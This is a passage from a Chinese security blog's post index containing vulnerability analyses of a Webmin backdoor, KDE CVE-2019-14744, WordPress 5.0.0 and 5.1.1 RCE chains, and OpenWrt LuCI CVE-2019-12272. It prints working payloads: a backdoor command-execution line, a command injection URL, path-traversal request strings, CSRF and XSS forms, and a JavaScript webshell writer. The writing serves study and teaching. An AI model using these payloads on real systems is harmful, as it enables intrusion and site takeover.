configuration\"; &#125;if ($wuser) &#123; # Update Webmin user's password $enc = &amp;acl::encrypt_password($in&#123;'old'&#125;, $wuser-&gt;&#123;'pass'&#125;); $enc eq $wuser-&gt;&#123;'pass'&#125; || &amp;pass_error($text&#123;'password_eold'&#125;,qx/$in&#123;'old'&#125;/); $perr = &amp;acl::check_password_restrictions($in&#123;'user'&#125;, $in&#123;'new1'&#125;); $perr &amp;&amp; &amp;pass_error(&amp;text('password_enewpass', $perr)); $wuser-&gt;&#123;'pass'&#125; = &amp;acl::encrypt_password($in&#123;'new1'&#125;); $wuser-&gt;&#123;'temppass'&#125; = 0; &amp;acl::modify_user($wuser-&gt;&#123;'name'&#125;, $wuser); &amp;reload_miniserv(); &#125; 总结 此CVE是由黑客以某种方式篡改了webmin的官方SourceForge代码而写入的后门。 整个后门的逻辑比较简单，分析过程也比较顺利。 在后门追踪的过程中，可以体会到很多技术以外的东西以及当年最初接触到黑客文化的一种侠义感（:)开始吹比）；第一次接触到代码跟踪，在过程中学到了一些东西。 参考资料 https://blog.firosolutions.com/exploits/webmin/ https://www.4hou.com/technology/19803.html https://paper.seebug.org/1019/ https://github.com/webmin/webmin/issues/947","categories":[{"name":"Web安全","slug":"Web安全","permalink":"https://hachp1.github.io/categories/Web安全/"}],"tags":[{"name":"漏洞分析","slug":"漏洞分析","permalink":"https://hachp1.github.io/tags/漏洞分析/"}]},{"title":"CVE-2019-14744 KDE4/5命令执行漏洞简析","slug":"CVE-2019-14744-KDE4-5命令执行漏洞简析","date":"2019-08-09T02:53:37.000Z","updated":"2025-02-06T15:11:50.508Z","comments":true,"path":"posts/漏洞分析/20190809-kde45ce.html","link":"","permalink":"https://hachp1.github.io/posts/漏洞分析/20190809-kde45ce.html","excerpt":"CVE-2019-14744 KDE4/5命令执行漏洞简析 漏洞简介 KDE Frameworks是一套由KDE社群所编写的库及软件框架，是KDE Plasma 5及KDE Applications 5的基础，并使用GNU通用公共许可证进行发布。其中所包含的多个独立框架提供了各种常用的功能，包括了硬件集成、文件格式支持、控件、绘图功能、拼写检查等。KDE框架目前被几个Linux发行版所采用，包括了Kubuntu、OpenMandriva、openSUSE和OpenMandriva。 2019年7月28日Dominik Penner（@zer0pwn）发现了KDE framework版本&lt;=5.60.0时存在命令执行漏洞。 2019年8月5日Dominik Penner在Twitter上披露了该漏洞，而此时该漏洞还是0day漏洞。此漏洞由KDesktopFile类处理.desktop或.directory文件的方式引起。如果受害者下载了恶意构造的.desktop或.directory文件，恶意文件中注入的bash代码就会被执行。","text":"CVE-2019-14744 KDE4/5命令执行漏洞简析 漏洞简介 KDE Frameworks是一套由KDE社群所编写的库及软件框架，是KDE Plasma 5及KDE Applications 5的基础，并使用GNU通用公共许可证进行发布。其中所包含的多个独立框架提供了各种常用的功能，包括了硬件集成、文件格式支持、控件、绘图功能、拼写检查等。KDE框架目前被几个Linux发行版所采用，包括了Kubuntu、OpenMandriva、openSUSE和OpenMandriva。 2019年7月28日Dominik Penner（@zer0pwn）发现了KDE framework版本&lt;=5.60.0时存在命令执行漏洞。 2019年8月5日Dominik Penner在Twitter上披露了该漏洞，而此时该漏洞还是0day漏洞。此漏洞由KDesktopFile类处理.desktop或.directory文件的方式引起。如果受害者下载了恶意构造的.desktop或.directory文件，恶意文件中注入的bash代码就会被执行。 2019年8月8日，KDE社区终于在发布的更新中修复了该漏洞；在此之前的三天内，此漏洞是没有官方补丁的。 一些八卦 在Dominik Penner公开此漏洞时，并没有告诉KDE社区此漏洞，直接将该0day的攻击详情披露在了Twitter上。公布之后，KDE社区的人员与Penner之间发生了很多有意思的事情，在这里不做描述。 影响版本 内置或后期安装有KDE Frameworks版本&lt;=5.60.0的操作系统，如Kubuntu。 漏洞复现 环境搭建 虚拟机镜像：kubuntu-16.04.6-desktop-amd64.iso KDE Framework 5.18.0 搭建时，注意虚拟机关闭网络，否则语言包下载十分消耗时间；此外，安装完成后进入系统要关掉iso影响，否则无法进入系统。 复现过程及结果 PoC有多种形式，此处使用三种方式进行复现，第1、2种为验证性复现，第3种为接近真实情况下攻击者可能使用的攻击方式。 PoC1： 创建一个文件名为”payload.desktop”的文件： 在文件中写入payload： 保存后打开文件管理器，写入的payload被执行： 文件内容如下： PoC2： 创建一个文件名为” .directory”的文件： 使用vi写入内容（此处有坑，KDE的vi输入backspace键会出现奇怪的反应，很不好用）： 写入payload： 保存后打开文件管理器，payload被成功执行： PoC3： 攻击者在本机启动NC监听： 攻击者将payload文件打包挂载至Web服务器中，诱导受害者下载： 受害者解压文件： 解压后，payload会被执行，攻击者接收到反连的Shell： 漏洞影响：虽然直接下载文件很容易引起受害者注意，但攻击者可以将恶意文件打包为压缩文件并使用社会工程学诱导受害者解开压缩包。不管受害者有没有打开解压后的文件，恶意代码都已经执行了，因为文件解压后KDE系统会调用桌面解析函数。此时受害者就容易中招。 漏洞原理简析 在Dominik Penner公布的细节中，对该漏洞已经有着比较详细的解释。在着手分析漏洞前，我们先学习一下Linux的desktop entry相关的知识。 desktop entry XDG 桌面配置项规范为应用程序和桌面环境的菜单整合提供了一个标准方法。只要桌面环境遵守菜单规范，应用程序图标就可以显示在系统菜单中。 每个桌面项必须包含 Type 和 Name，还可以选择定义自己在程序菜单中的显示方式。 也就是说，这是一种解析桌面项的图标、名称、类型等信息的规范。 使用这种规范的开发项目应该通过目录下的.directory或.desktop文件记录该目录下的解析配置。 详见：https://wiki.archlinux.org/index.php/Desktop_entries_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87) 漏洞的产生 KDE的桌面配置解析参考了XDG的方式，但是包含了KDE自己实现的功能；并且其实现与XDG官方定义的功能也有出入，正是此出入导致了漏洞。 在KDE文档中有如下的话（https://userbase.kde.org/KDE_System_Administration/Configuration_Files#Shell_Expansion）： 1234567891011Shell ExpansionSo called Shell Expansion can be used to provide more dynamic default values. With shell expansion the value of a configuration key can be constructed from the value of an environment variable.To enable shell expansion for a configuration entry, the key must be followed by [$e]. Normally the expanded form is written into the users configuration file after first use. To prevent that, it is recommend to lock the configuration entry down by using [$ie].Example: Dynamic EntriesThe value for the &quot;Email&quot; entry is determined by filling in the values of the $USER and $HOST environment variables. When joe is logged in on joes_host this will result in a value equal to &quot;joe@joes_host&quot;. The setting is not locked down.[Mail Settings]Email[$e]=$&#123;USER&#125;@$&#123;HOST&#125; 为了提供更加灵活的设置解析，KDE实现并支持了动态配置，而此处的${USER}尤其令人注意，该项取自环境变量，可以推测，此处与命令执行肯定有联系。 每当KDE桌面系统要读取图标等桌面配置时，就会调用一次readEntry函数；从Dominik Penner给出的漏洞细节中，可以看到追踪代码的过程。整个漏洞的执行过程如下： 首先，创建恶意文件： 1234payload.desktop[Desktop Entry]Icon[$e]=$(echo hello&gt;~/POC.txt) 进入文件管理器，此时系统会对.desktop文件进行解析；进入解析Icon的流程，根据文档中的说明，参数中带有[$e]时会调用shell动态解析命令： kdesktopfile.cpp: 12345QString KDesktopFile::readIcon() const&#123; Q_D(const KDesktopFile); return d-&gt;desktopGroup.readEntry(\"Icon\", QString()); &#125; 跟进，发现调用了KConfigPrivate::expandString(aValue)： kconfiggroup.cpp: 12345678910111213141516171819QString KConfigGroup::readEntry(const char *key, const QString &amp;aDefault) const&#123; Q_ASSERT_X(isValid(), \"KConfigGroup::readEntry\", \"accessing an invalid group\"); bool expand = false; // read value from the entry map QString aValue = config()-&gt;d_func()-&gt;lookupData(d-&gt;fullName(), key, KEntryMap::SearchLocalized, &amp;expand); if (aValue.isNull()) &#123; aValue = aDefault; &#125; if (expand) &#123; return KConfigPrivate::expandString(aValue); &#125; return aValue;&#125; 再跟进，结合之前对KDE官方文档的解读，此处是对动态命令的解析过程，程序会把字符串中第一个出现的$(与第一个出现的)之间的部分截取出来，作为命令，然后调用popen执行： kconfig.cpp 12345678910111213141516171819202122232425262728QString KConfigPrivate::expandString(const QString &amp;value)&#123; QString aValue = value; // check for environment variables and make necessary translations int nDollarPos = aValue.indexOf(QLatin1Char('$')); while (nDollarPos != -1 &amp;&amp; nDollarPos + 1 &lt; aValue.length()) &#123; // there is at least one $ if (aValue[nDollarPos + 1] == QLatin1Char('(')) &#123; int nEndPos = nDollarPos + 1; // the next character is not $ while ((nEndPos &lt;= aValue.length()) &amp;&amp; (aValue[nEndPos] != QLatin1Char(')'))) &#123; nEndPos++; &#125; nEndPos++; QString cmd = aValue.mid(nDollarPos + 2, nEndPos - nDollarPos - 3); QString result;// FIXME: wince does not have pipes#ifndef _WIN32_WCE FILE *fs = popen(QFile::encodeName(cmd).data(), \"r\"); if (fs) &#123; QTextStream ts(fs, QIODevice::ReadOnly); result = ts.readAll().trimmed(); pclose(fs); &#125;#endif 自此，漏洞利用过程中的代码执行流程分析完毕；可以看到KDE在解析桌面设置时，以直接使用执行系统命令获取返回值的方式动态获得操作系统的一些参数值；为了获得诸如${USER}这样的系统变量直接调用系统命令，这个做法是不太妥当的。 官方修补方案分析 官方在最新版本中给出了简单粗暴的修复手段，直接删除了popen函数和其执行过程，从而除去了调用popen动态解析[e]属性的功能： 此外，官方还不忘吐槽了一波： 1234Summary:It is very unclear at this point what a valid use case for this featurewould possibly be. The old documentation only mentions $(hostname) asan example, which can be done with $HOSTNAME instead. 总结 个人认为这个漏洞在成因以外的地方有着更大的意义。首先，不太清楚当初编写KDE框架的开发人员的用意，也许是想让框架更灵活；但是在文档的使用用例中，只是为了获取${USER}变量的值而已。在命令执行上有些许杀鸡用牛刀的感觉。 从这个漏洞可以看出灵活性与安全性在有的时候是互相冲突的，灵活性高，也意味着更有可能出现纰漏，这给开发人员更多的警示。 漏洞发现者在没有通知官方的情况下直接公布了漏洞细节，这个做法比较有争议。在发现漏洞时，首先将0day交给谁也是个问题，个人认为可以将漏洞提交给厂商，待其修复后再商议是否要公布。可能国际上的hacker思维与国内有着比较大的差异，在Dominik Penner的Twitter下竟然有不少的人支持他提前公布0day，他自己也解释是想要在defcon开始之前提交自己的0day，这个做法以及众人的反应值得去品味。 参考资料 漏洞细节 发现者推特 演示视频 官方修复细节 修复补丁","categories":[{"name":"漏洞分析","slug":"漏洞分析","permalink":"https://hachp1.github.io/categories/漏洞分析/"}],"tags":[{"name":"漏洞分析","slug":"漏洞分析","permalink":"https://hachp1.github.io/tags/漏洞分析/"}]},{"title":"WordPress 5.0.0 RCE 漏洞分析","slug":"WordPress-5-0-0-RCE-漏洞分析","date":"2019-07-15T09:17:33.000Z","updated":"2025-02-06T15:11:51.218Z","comments":true,"path":"posts/Web安全/20190715-wp50.html","link":"","permalink":"https://hachp1.github.io/posts/Web安全/20190715-wp50.html","excerpt":"WordPress 5.0.0 RCE 漏洞分析 环境搭建 操作系统：win10 PHP 5.6.28 WP 4.9.4 注意：WP有自动更新会自动修补漏洞，需要在wp-config.php中添加define('AUTOMATIC_UPDATER_DISABLED',true);","text":"WordPress 5.0.0 RCE 漏洞分析 环境搭建 操作系统：win10 PHP 5.6.28 WP 4.9.4 注意：WP有自动更新会自动修补漏洞，需要在wp-config.php中添加define('AUTOMATIC_UPDATER_DISABLED',true); 漏洞利用过程中的一种代码执行流程（最后会有不同系统的利用过程） 由于这个漏洞的特殊性，不同的系统的利用链和细节不一样，但是漏洞本身的原理是一致的。一种利用流程为： 进入管理后台，媒体文件页面，上传图片马，在更新图片信息处使用burp增加post参数_wp_attached_file并写入目录穿越的路径到数据库 编辑图片马，在编辑图片处任意编辑后，调用save函数时会读取上一步构造的路径，写入图片到目录穿越的任意文件夹（此处的关键函数为mkdir，有很多细节在后文中会提到） —前面两步做到了将图片马上传至任意目录— 上传一个任意格式的辅助文件（txt等都行），在更新文件信息处增加post参数_wp_page_template并写入模板信息到数据库（将模板信息写为图片马的地址） 访问辅助文件的对应链接，则执行了图片马（模板会被加载，无视图片马后缀） 复现 首先，上传图片： 在编辑图片信息处点击更新： 使用burp截包，加入payload： 1&amp;meta_input[_wp_attached_file]=2019/07/1.jpg#/../../../../themes/twentyseventeen/1.jpg 注意：主题的目录要根据现在使用的主题来定，主题的根目录即为该目录，如我在复现时根目录为：twentyseventeen 可以看到数据库成功写入将要目录穿越的路径： 然后对刚刚的图片任意编辑并点击保存： 可以看到，图片马成功转移到主题目录下： 由于此处的图片经过gd或imagick库处理，在真实利用时需要制作出能抵抗处理的图片马，我在此处复现时跳过这步，直接硬写入phpinfo： 到此时，已经将图片马成功移动到主题目录，就等着被包含了。 —分割线— 模板包含时，首先上传一个辅助文件： 点击更新： 使用burp截包修改payload： 1&amp;meta_input[_wp_page_template]=1-e1562921273409.jpg 访问test文件所对应的网页，成功执行代码： 漏洞原理以及修复手段分析 路径变量覆盖漏洞 在编辑并更新图片的时候会调用edit_post()函数，wp-admin/includes/post.php： 123456789101112131415161718192021222324function edit_post( $post_data = null ) &#123; global $wpdb; if ( empty($post_data) ) $post_data = &amp;$_POST;...$success = wp_update_post( $post_data );跟进 wp_update_post-&gt;if ($postarr['post_type'] == 'attachment') return wp_insert_attachment($postarr);跟进 wp_insert_attachment-&gt;return wp_insert_post( $data, $wp_error );跟进 wp_insert_post -&gt; if ( ! empty( $postarr['meta_input'] ) ) &#123; foreach ( $postarr['meta_input'] as $field =&gt; $value ) &#123; update_post_meta( $post_ID, $field, $value ); &#125; &#125;//终于到了关键点，可以看到对每个meta_input都更新进数据库，这样一来，攻击者就可以覆盖数据库中的变量了。 由于WordPress默认的上传路径为wp-content/uploads/years/month，此时，可以利用目录遍历将其覆盖，payload为&amp;meta_input[_wp_attached_file]=2019/07/1.jpg#/../../../../themes/twentyseventeen/1.jpg 文件任意路径写入 在编辑图片并保存时，会调用 /wp-admin/admin-ajax.php ，跟进时，可以发现函数进入了wp_save_image，此时会从数据库中取出被恶意更改的路径： 1234...$path = get_attached_file( $post_id ); //查询数据库获取路径，而此时读取到的路径已经是覆盖过的了...parent::make_image //调用保存图片的函数 在调用创建图片时，首先调用wp_mkdir_p( dirname( $filename ) )， 整个函数会创建目录；其中，包含创建目录的操作 @mkdir( $target, $dir_perms, true )；但是在windows下，创建文件的操作会失败。 然后会使用call_user_func_array调用gd或者imagick保存图片文件（在windows下虽然前一步创建失败，但是不存在的目录也能解析，所以可以直接保存图片） 此时，就成功把图片马写入了模板文件夹。 构造?或#的意义，WP的图片获取机制 在编辑页面等地方获取图片时，如果此时使用普通的路径./themes/twentyseventeen/1.jpg，WP会不能获取到图片从而不能进行图片编辑和保存的操作。 在获取图片时，WP首先从数据库中获取路径信息， 由于有的插件根据访问的URL动态生成图片，WP中的图片获取逻辑为： 在本地文件夹中查找。 本地未找到（判断为动态图片），使用http协议获取。 关键函数为： 1234567/** * Retrieve the path or url of an attachment's attached file. * * If the attached file is not present on the local filesystem (usually due to replication plugins), * then the url of the file is returned if url fopen is supported.**/_load_image_to_edit_path 所以，此处构造的payload意义在WP首先使用fopen访问2019/07/1.jpg#/../../../../themes/twentyseventeen/1.jpg，显然，fopen不能访问该地址；然后再使用http访问http://xxxx....2019/07/1.jpg#/../../../../themes/twentyseventeen/1.jpg，#后的内容被当做锚点处理，成功访问到图片；从而可以顺利进行图片的编辑操作。 在WordPress成功访问到图片后，就会触发保存操作，这样就绕过了图片存在性检验，达到了向任意路径写图片的操作。 模板变量覆盖 在数据库中很容易注意到一条数据： 1_wp_page_template default 该变量使用数据库变量覆盖的方法可以类似地进行覆盖，将其覆盖为图片马的名称。但是要注意以下代码(/wp-includes/post.php)，可以看到，如果page_template已经被设置为非default，并攻击者试图继续覆盖时，操作不能成功，也就是说，每个媒体文件只能被设置一次模板文件，所以可以使用辅助上传新文件的方式来写入模板位置： 123456789101112if ( ! empty( $postarr['page_template'] ) ) &#123; $post-&gt;page_template = $postarr['page_template']; $page_templates = wp_get_theme()-&gt;get_page_templates( $post ); if ( 'default' != $postarr['page_template'] &amp;&amp; ! isset( $page_templates[ $postarr['page_template'] ] ) ) &#123; if ( $wp_error ) &#123; return new WP_Error( 'invalid_page_template', __( 'Invalid page template.' ) ); &#125; update_post_meta( $post_ID, '_wp_page_template', 'default' ); &#125; else &#123; update_post_meta( $post_ID, '_wp_page_template', $postarr['page_template'] ); &#125; &#125; 模板文件包含 全局搜索发现了_wp_page_template的引入位置(wp-includes/post-template.php)： 123456789101112131415function get_page_template_slug( $post = null ) &#123; $post = get_post( $post ); if ( ! $post ) &#123; return false; &#125; $template = get_post_meta( $post-&gt;ID, '_wp_page_template', true ); if ( ! $template || 'default' == $template ) &#123; return ''; &#125; return $template;&#125; 打断点访问一下上传的辅助文件对应的网页，查看一下调用栈，可以看到程序首先通过index主页路由至test，然后经过一系列模板调用操作，最终加载到了数据库中保存的模板文件： 12345post-template.php:1683, get_page_template_slug()template.php:487, get_single_template()template-loader.php:55, require_once()wp-blog-header.php:19, require()index.php:17, &#123;main&#125;() 最后包含了模板文件： 1apply_filters( 'template_include', $template ) 官方补丁 首先，补丁限制了参数，不允许传入’meta_input’, ‘file’, ‘guid’；这样一来，攻击者就没有办法覆盖Post Meta变量了，从而在更改路径和更改模板上都不能利用了。 然后，post_ID也不直接从POST请求获取，而是读取变量获得：$post_data['post_ID'] = $post_ID;，这样，攻击者就不能控制post_id了。 利用思路比较 由于此漏洞涉及到mkdir这个关键的函数，对不同操作系统，其表现不同；所以网上发布的各种分析文章产生了多种利用方法。 mkdir各环境特点概要如下： Linux平台上mkdir不支持不存在的目录跳转。（即会检测每一层有效性） Windows平台上mkdir支持不存在的目录跳转，并且只会创建最后一步的文件夹（即先化简路径，化简后再创建文件夹，不存在的路径不会创建） Windows下*与?不能出现在路径中 经过总结，大概有以下几种： Windows下： 直接调用crop-image（此时输出的图片为cropped_xxx.jpg） windows下直接利用后台管理页面上提供的image-editor的任意一项修改（裁剪、旋转、对称均可），可以无视不存在的目录直接创建在目标目录下（我使用win10、PHP 5.6.28、wp4.9.4环境下成功利用）（此时输出xxx-e1562915044612.jpg） Linux下： 直接调用crop-image 首先利用image-editor创建文件夹（一次只能创建一层文件夹），再次调用image-editor创建图片马；创建文件夹时的payload:&amp;meta_input[_wp_attached_file]=2019/07/1.jpg#/test.jpg，此时在07创建了1.jpg#文件夹（在Windows下也能成功）： 使用crop-img的payload为： 12345action=image-editor&amp;_ajax_nonce=d6b0263153&amp;postid=4&amp;history=%5B%7B%22c%22%3A%7B%22x%22%3A86%2C%22y%22%3A61%2C%22w%22%3A227%2C%22h%22%3A110%7D%7D%5D&amp;target=all&amp;context=edit-attachment&amp;do=save-&gt;action=crop-image&amp;_ajax_nonce=d6b0263153&amp;id=4&amp;cropDetails[x1]=10&amp;cropDetails[y1]=10&amp;cropDetails[width]=10&amp;cropDetails[height]=10&amp;cropDetails[dst_width]=100&amp;cropDetails[dst_height]=100 遇到的坑 自动更新 wp会自动更新小版本，需要在wp-config.php添加define('AUTOMATIC_UPDATER_DISABLED',true); mkdir windows环境下，文件夹中不能出现?号，此时，使用php内置函数mkdir就无法执行成功；网上的payload不能直接用；需要将?改为#。 id参数名变更 使用crop-image时，postid改为id。 template覆盖 如果设置了这个值，但这个文件不存在，则会被定义为default。 如果该值被设置，则没办法通过这种方式修改。 所以要写模板的路径必须新上传一个媒体文件 写在最后 整个利用链涉及到的模块很多，也涉及到了不同操作系统的某些特性。漏洞的逻辑较为复杂，自己花了比较长的时间，也学到很多东西。 就这个漏洞而言，WP直接留下的媒体文件信息更新接口在前端上并没有直接的反应，不知道更新文件路径、裁剪图片和文件模板的接口直接暴露在外是怎样的想法。也许是功能未实现的遗留，也许是计划要实现的功能，为什么出现这些函数也不得而知。需要对WP整个执行流程甚至源码开发本身有比较深入的理解才能知道其中产生的原因。 就不同操作系统而言，mkdir函数的变现直接影响到了利用过程，在不同系统、不同php版本下都有很多不一样的细节。在天融信阿尔法实验室的文章中有较为详细的底层探究知识，自己在这块还比较薄弱，需要进一步学习。 参考资料 https://blog.ripstech.com/2019/wordpress-image-remote-code-execution/ https://paper.seebug.org/863/ https://zeroyu.xyz/2019/03/06/wordpress-5-0-0-rce-aanalysis/ http://blog.nsfocus.net/wordpress-5-0-0-rce/ https://lorexxar.cn/2019/02/22/wordpress-core-rce/ https://paper.seebug.org/825/ http://yulige.top/?p=578","categories":[{"name":"Web安全","slug":"Web安全","permalink":"https://hachp1.github.io/categories/Web安全/"}],"tags":[{"name":"漏洞分析","slug":"漏洞分析","permalink":"https://hachp1.github.io/tags/漏洞分析/"}]},{"title":"CVE-2019-12272 OpenWrt图形化管理界面LuCI命令注入分析","slug":"CVE-2019-12272-OpenWrt图形化管理界面LuCI命令注入分析","date":"2019-07-10T04:06:49.000Z","updated":"2025-02-06T15:11:50.468Z","comments":true,"path":"posts/Web安全/20190710-lucirce.html","link":"","permalink":"https://hachp1.github.io/posts/Web安全/20190710-lucirce.html","excerpt":"CVE-2019-12272 OpenWrt图形化管理界面LuCI命令注入分析 漏洞简介 OpenWrt LuCI是一款用于OpenWrt（Linux发行版）的图形化配置界面。 OpenWrt LuCI 0.10及之前版本中的admin/status/realtime/bandwidth_status和admin/status/realtime/wireless_status端点存在命令注入漏洞。该漏洞源于外部输入数据构造可执行命令过程中，网络系统或产品未正确过滤其中的特殊元素。攻击者可利用该漏洞执行非法命令。","text":"CVE-2019-12272 OpenWrt图形化管理界面LuCI命令注入分析 漏洞简介 OpenWrt LuCI是一款用于OpenWrt（Linux发行版）的图形化配置界面。 OpenWrt LuCI 0.10及之前版本中的admin/status/realtime/bandwidth_status和admin/status/realtime/wireless_status端点存在命令注入漏洞。该漏洞源于外部输入数据构造可执行命令过程中，网络系统或产品未正确过滤其中的特殊元素。攻击者可利用该漏洞执行非法命令。 环境搭建 由于OpenWrt中自带LuCI，只需要使用虚拟机正常运行OpenWrt即可，在这里使用VMware运行OpenWrt虚拟机。 OpenWrt版本：Chaos Calmer OpenWrt 15.05.1 下载地址：https://archive.openwrt.org/chaos_calmer/15.05.1/x86/generic/openwrt-15.05.1-x86-generic-combined-ext4.img.gz 安装成功后成功访问LuCI主页： 设置登陆密码后成功登陆： 为了直接分析LuCI源码，在虚拟机中找到LuCI的地址并使用tar打包： 由于openwrt中没有文件下载工具，而LuCI已经把目录映射了，直接将打包文件移动至http映射目录下，走http下载LuCI源码： POC 传入Payload: http://192.168.153.4/cgi-bin/luci/admin/status/realtime/bandwidth_status/eth0$(id&gt;cmd)： 成功执行命令： 漏洞分析 LuCI采用了典型的MVC三层架构，并使用Lua脚本开发；在解析请求时，首先进入admin/status.lua中的controller入口进行路由，然后调用相应的model进行处理。 而漏洞的触发点是在controller的bandwidth_status函数中，该函数将用户传入的字符串直接格式化到命令中并执行，造成了RCE。 代码具体执行过程如下： 使用HTTP访问路径/admin/status/realtime/bandwidth_status(或wireless_status)/[param]，首先进入index entry进行路由，在路由中使用dispatcher的call函数调用了action_bandwidth函数： Controller/index.lua: Dispatcher.lua中的call函数: 然后，进入action_bandwidth函数，url解析路由之后的部分将被当做参数传入，未过滤而使用%q直接将参数格式化到字符串中。%q将在iface外包裹双引号。 使用io.popen执行命令，在bash下，双引号中的$()或``会执行，从而达到命令执行的目的： 此处相当于执行命令：sh -c luci-bwc –i “eth0$(id&gt;cmd)” 2&gt;/dev/null： 使用EXP执行ping命令后，可以在openwrt下查看到执行的命令： exp脚本 脚本已上传：https://github.com/HACHp1/LuCI_RCE_exp 执行效果： 斜杠绕过 在执行的命令中需要斜杠(/)时，由于路径解析的问题，斜杠无法使用，此时可以考虑使用bash内置变量来代替。 遇到的坑 最开始的时候考虑使用${HOME:0:1}来替代。然后发现并不能成功。但是直接在命令行中、重新开一个lua脚本执行、直接在lua交互处执行却都可以执行。 最后发现问题竟然是在LuCI中$HOME变量没有值，但是在正常情况是有值的，在此处卡的时间很长。 解决办法 在LuCI中，${PATH:0:1}是没有被更改的，可以直接使用。测试payload为：ls ${PATH:0:1}。 漏洞修复方案分析 查看源码修复漏洞的地方，新的源码使用gsub将iface中的单引号去掉，并在最外层加上了单引号，这样整个iface参数就仅作为字符串而不会被执行： 在源码中输出一下： Iface参数被单引号包裹，作为r参数传入luci-bwc，不会执行ls命令： 写在最后 整个漏洞与半年前爆出的thinkphp RCE都与路由解析和controller相关，可见MVC构建的controller处比较容易出现安全漏洞。由于MVC模型的特性，Controller是MVC模式函数调用的入口，如果攻击者能够控制controller或者能够注入并利用controller，就容易出现漏洞。 参考资料 https://www.jianshu.com/p/bfb93c4e8dc9 https://forum.openwrt.org/t/vulnerable-releases-for-cve-2019-12272/38564 https://blog.csdn.net/ballack_linux/article/details/81331527 https://github.com/openwrt/luci/commit/9e4b8a91384562e3baee724a52b72e30b1aa006d","categories":[{"name":"Web安全","slug":"Web安全","permalink":"https://hachp1.github.io/categories/Web安全/"}],"tags":[{"name":"漏洞分析","slug":"漏洞分析","permalink":"https://hachp1.github.io/tags/漏洞分析/"}]},{"title":"WordPress 5.1.1 ，CSRF->XSS->RCE漏洞分析","slug":"WordPress-5-1-1-，CSRF-XSS-RCE漏洞分析","date":"2019-07-10T02:27:51.000Z","updated":"2025-02-06T15:11:51.248Z","comments":true,"path":"posts/Web安全/20190710-wp511.html","link":"","permalink":"https://hachp1.github.io/posts/Web安全/20190710-wp511.html","excerpt":"WordPress 5.1.1 ，CSRF-&gt;XSS-&gt;RCE漏洞分析 WordPress安全机制与XSS写shell","text":"WordPress 5.1.1 ，CSRF-&gt;XSS-&gt;RCE漏洞分析 WordPress安全机制与XSS写shell nonce机制 在WordPress中，对不同操作都做了nonce检测机制，以防CSRF攻击。 nonce值的生成： 1$expected = substr( wp_hash( $i . '|' . $action . '|' . $uid . '|' . $token, 'nonce'), -12, 10 ); 其中,$i是由时间决定的随机数，每天的0时与12时更新一次；$action是操作；$uid是用户id；$token是用户登陆时服务器产生的，每次登陆都不同。 由此可见，nonce可以很好地避免CSRF等漏洞的产生。 后台账户重要性 WordPress认为，后台管理员是有安全意识的，而且不会被盗。所以在WordPress的后台没有XSS过滤；甚至可以通过插件编辑器直接写入webshell。 XSS后台写shell 有了nonce机制并且给后台用户较大的权限时，就可以通过XSS直接写入webshell。 利用后台管理员可以通过编辑插件写入任意代码这个特点，我们可以构造写入任意代码的JS。 可以获取webshell的JS脚本为（测试环境：WordPress5.1.1，不同版本的参数可能不同，需要抓包重写）： 1234567891011121314151617181920212223242526&lt;html&gt;&lt;script&gt;p = 'wordpress/wp-admin/plugin-editor.php?';q = 'file=hello.php';s = '&lt;?php phpinfo();';a = new XMLHttpRequest();a.open('GET', p+q, 0);a.send();$ = 'nonce=' + /nonce\" value=\"([^\"]*?)\"/.exec(a.responseText)[1] +'&amp;newcontent=' + s + '&amp;action=edit-theme-plugin-file&amp;' + q +'&amp;plugin=hello.php';b = new XMLHttpRequest();b.open('POST', p+q, 1);b.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');b.send($);b.onreadystatechange = function()&#123; if (this.readyState == 4) &#123; fetch('wordpress/wp-content/plugins/hello.php'); &#125;&#125;&lt;/script&gt;&lt;/html&gt; 漏洞复现 由于我复现的时候 5.1.1已经被修复了，贴一个找到的未修复的commit： https://codeload.github.com/WordPress/WordPress/zip/df681b2ee0c01c3282f07feaed0b498546c87be3 安装完WordPress并使用管理员登陆后，进入评论使用burp构造CSRFpayload： 1&lt;a title=' \" onmouseover=alert(1) attr2=\" ' rel='1'&gt;click 生成的POC： 1234567891011121314&lt;html&gt; &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt; &lt;body&gt; &lt;script&gt;history.pushState('', '', '/')&lt;/script&gt; &lt;form action=\"http://localhost:801/cms/wordpress-5.1.1/wordpress/wp-comments-post.php\" method=\"POST\"&gt; &lt;input type=\"hidden\" name=\"comment\" value=\"&amp;lt;a&amp;#32;title&amp;#61;&amp;apos;&amp;#32;&amp;quot;&amp;#32;onmouseover&amp;#61;alert&amp;#40;1&amp;#41;&amp;#32;attr2&amp;#61;&amp;quot;&amp;#32;&amp;apos;&amp;#32;rel&amp;#61;&amp;apos;1&amp;apos;&amp;gt;click\" /&gt; &lt;input type=\"hidden\" name=\"submit\" value=\"Post&amp;#32;Comment\" /&gt; &lt;input type=\"hidden\" name=\"comment&amp;#95;post&amp;#95;ID\" value=\"1\" /&gt; &lt;input type=\"hidden\" name=\"comment&amp;#95;parent\" value=\"0\" /&gt; &lt;input type=\"hidden\" name=\"&amp;#95;wp&amp;#95;unfiltered&amp;#95;html&amp;#95;comment\" value=\"no_need_correct\" /&gt; &lt;input type=\"submit\" value=\"Submit request\" /&gt; &lt;/form&gt; &lt;/body&gt;&lt;/html&gt; 管理用户访问POC后，会产生一个a标签并注入js代码，执行效果： 此时，就可以执行写shell的JS代码，达到getshell的目的。 漏洞分析 再次看看前面的payload： 1&lt;a title=' \" onmouseover=alert(1) attr2=\" ' rel='1'&gt;click 需要注意的是：a后的第一个属性必须为$allowedposttags白名单中的属性，如title、id等，否则WordPress会直接去掉该属性。 查看全局允许的属性名： 由于之前的操作繁琐（主要是评论的各种过滤），直接在漏洞修复处打断点： 123456789101112131415161718192021222324252627function wp_rel_nofollow_callback( $matches ) &#123; $text = $matches[1]; $atts = shortcode_parse_atts( $matches[1] ); $rel = 'nofollow'; if ( preg_match( '%href=[\"\\'](' . preg_quote( set_url_scheme( home_url(), 'http' ) ) . ')%i', $text ) || preg_match( '%href=[\"\\'](' . preg_quote( set_url_scheme( home_url(), 'https' ) ) . ')%i', $text ) ) &#123; return \"&lt;a $text&gt;\"; &#125; if ( ! empty( $atts['rel'] ) ) &#123; //rel属性不为空时 $parts = array_map( 'trim', explode( ' ', $atts['rel'] ) ); if ( false === array_search( 'nofollow', $parts ) ) &#123; $parts[] = 'nofollow'; &#125; $rel = implode( ' ', $parts ); unset( $atts['rel'] ); $html = ''; foreach ( $atts as $name =&gt; $value ) &#123; $html .= \"&#123;$name&#125;=\\\"$value\\\" \"; 